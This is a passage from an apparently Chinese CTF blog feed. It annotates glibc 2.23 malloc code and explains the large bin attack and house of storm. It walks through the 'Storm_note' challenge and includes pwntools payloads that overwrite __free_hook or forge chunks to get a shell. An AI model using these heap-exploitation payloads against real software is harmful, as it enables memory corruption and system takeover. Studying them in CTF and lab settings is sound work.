class="number">2</span>]+libc_base</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x13377331</span>)+p64(storage) + p64(<span class="number">0x1000</span>) + p64(free_hook) + p64(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">0</span>,payload)</span><br><span class="line">    edit(<span class="number">1</span>,p64(getshell))</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前一直有说要刷buu，但一直没怎么行动，今天开始，要好好刷题了!&lt;br&gt;这篇blog将持续不定时更新（如果能日更就好了）&lt;br&gt;啊宁！冲呀！&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="wp" scheme="https://c0yo7e.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>largebin_attack-glibc2.23</title>
    <link href="https://c0yo7e.github.io/2020/08/01/largebin-attack-glibc2-23/"/>
    <id>https://c0yo7e.github.io/2020/08/01/largebin-attack-glibc2-23/</id>
    <published>2020-08-01T14:16:07.000Z</published>
    <updated>2020-08-04T15:54:19.337Z</updated>
    
    <content type="html"><![CDATA[<h2 id="unsortedbin-拆分smallbin和largebin："><a href="#unsortedbin-拆分smallbin和largebin：" class="headerlink" title="unsortedbin 拆分smallbin和largebin："></a>unsortedbin 拆分smallbin和largebin：</h2><p>把largebin放入large bin list里面的话得先解链，和unlink其实差不多，不过这里用到了nextsize</p><p>glibc2.23   malloc/malloc.c:3470</p><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">//遍历unsortedbin_list</span></span><br><span class="line">    &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">              <span class="comment">//chunk大小不能小于等于2*SIZE_SZ，不能超过分配区总的内存分配量</span></span><br><span class="line">            malloc_printerr (check_action, <span class="string">"malloc(): memory corruption"</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;<span class="comment">//chunk 属于smallbin的获得相应的index，当前chunk插入到fwd和bck之间</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;<span class="comment">//largebin和上面一样</span></span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;<span class="comment">//largebin中有空闲chunk</span></span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;<span class="comment">//如果当前chunk的size小于最后一个的size则插到链表最后</span></span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;<span class="comment">//正向找第一个chunk大小小于等于当前chunk</span></span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                        <span class="comment">//如果找到和当前chunk的size一样的chunk，当前chunk插入到fwd之后</span></span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;<span class="comment">//如果当前size还没有别的chunk，则成为chunk size的代表</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="comment">//fwd-&gt;bk_nextsize可控，因此victim-&gt;bk_nextsize可控</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">//第一次任意地址写入unsorted bin chunk的地址 </span></span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span> </span><br><span class="line">              <span class="comment">//largebin中没有chunk，直接将chunk写入chunksize链表</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim; <span class="comment">//第二次任意地址写入unsorted bin chunk的地址</span></span><br><span class="line">          <span class="comment">//将chunk插入到largeb bin中，将large bin所对应binmap的相应bit位置</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS) <span class="comment">//遍历最多10000遍</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h2 id="house-of-strom利用："><a href="#house-of-strom利用：" class="headerlink" title="house of strom利用："></a>house of strom利用：</h2><p>我们要构造unsorted bin 里面有一个large bin chunk未被分配进入large bin ，large bin 里也有一个chunk，保证unsorted bin里的那个large bin chunk的size要比large bin里已有的这个chunk的size要大一点，但是都属于同一个index。<br>（large bin 里的index分配跨度的0x3f，eg: 0x4c0-0x4ff;0x500-0x53f）</p><p>我们可以利用堆溢出改掉一个原本在largebin列表内的chunk的bk和bk_nextsize，指向我们的目的地址</p><p>bk指向的位置+0x10的位置（fd）填入当前chunk的地址，bk_nextsize指向的位置+0x20的位置（fd_nextsize）填入当前chunk地址</p><p>eg:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk1 : <span class="number">0x000400</span>                                addr:<span class="number">0x000818</span> : <span class="number">0x000400</span></span><br><span class="line">bk: <span class="number">0x000808</span>            -----------------&gt;            <span class="number">0x000820</span> : <span class="number">0x000400</span></span><br><span class="line">bk_nextsize:<span class="number">0x000800</span></span><br></pre></td></tr></table></figure><h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h3 id="西湖论剑-Storm-note"><a href="#西湖论剑-Storm-note" class="headerlink" title="西湖论剑 Storm_note"></a>西湖论剑 Storm_note</h3><p><strong>漏洞</strong>：off by null<br><strong>利用</strong>：large bin attack、overlap（没有show本能是IO_FILE的，但是零字节溢出会覆盖部分地址，就打消了这个念头</p><p><strong>init_proc 函数</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> init_proc()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !mallopt(<span class="number">1</span>, <span class="number">0</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mmap(<span class="number">0xABCD0000</span>LL, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L) != <span class="number">2882338816L</span>L )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  result = read(fd, <span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">48</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int mallopt(int param,int value) ：</span><br><span class="line">M_MXFAST:定义使用fastbins的内存请求大小的上限( param=<span class="number">1</span>，相当于被禁，即<span class="built_in">free</span>完之后不入fastbin <span class="built_in">list</span></span><br></pre></td></tr></table></figure><p><strong>后门函数</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">noreturn <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"If you can open the lock, I will let you in"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;buf, <span class="number">0xABCD0100</span>LL, <span class="number">0x30</span>uLL) )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即  输入=随机数  就能触发后门</p><p><strong>alloc 函数</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">alloc_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span> &amp;&amp; note[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"full!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"size ?"</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">0xFFFFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      note[i] = <span class="built_in">calloc</span>(v1, <span class="number">1u</span>LL);</span><br><span class="line">      note_size[i] = v1;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid size"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>edit 函数</strong> （off by null)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Index ?"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Content: "</span>);</span><br><span class="line">    v2 = read(<span class="number">0</span>, note[v1], note_size[v1]);</span><br><span class="line">    *(note[v1] + v2) = <span class="number">0</span>;  <span class="comment">//off by null</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>delete 函数</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">delete_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Index ?"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">15</span> &amp;&amp; note[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(note[v1]);</span><br><span class="line">    note[v1] = <span class="number">0L</span>L;</span><br><span class="line">    note_size[v1] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid index"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">overlap：</span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#此刻chunk_list里面只有chunk1的位置是空缺的</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)<span class="comment">#off by null</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment">#7 0x050  --&gt;chunk2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)    <span class="comment">#overlap  把0x18大小的chunk free掉了，空了一个位置，并且和前面堆块合并</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#recover</span></span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x4e0</span>)<span class="comment">#2  实现chunk2和chunk7堆块重叠</span></span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/largebin-attack-glibc2-23/1.png" alt></p><p>后面chunk8那个的实现也差不多的</p><p><strong>large bin attack:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">target= <span class="number">0xabcd0100</span></span><br><span class="line">fake_chunk = target- <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>) <span class="comment"># size</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_chunk)      <span class="comment"># bk --&gt;构造fackchunk的fd</span></span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/largebin-attack-glibc2-23/2.png" alt></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#理应写入下一个chunk的fd处，但是刚好借助位置可以写入fakechunk的bk处，防止程序crash</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)   <span class="comment">#target chunk fake size  一定要0x56</span></span><br><span class="line">edit(<span class="number">8</span>,payload2)</span><br></pre></td></tr></table></figure><p><img src="/2020/08/01/largebin-attack-glibc2-23/3.png" alt></p><p>再次malloc之后，chunk7从unsorted bin到large bin chunk8的fd指向chunk7，chunk7剩余部分存入unsorted bin ，因为堆块重叠，chunk2是large bin，且早被free了，所以chunk2被存入large bin</p><p><img src="/2020/08/01/largebin-attack-glibc2-23/4.png" alt></p><p><img src="/2020/08/01/largebin-attack-glibc2-23/5.png" alt></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 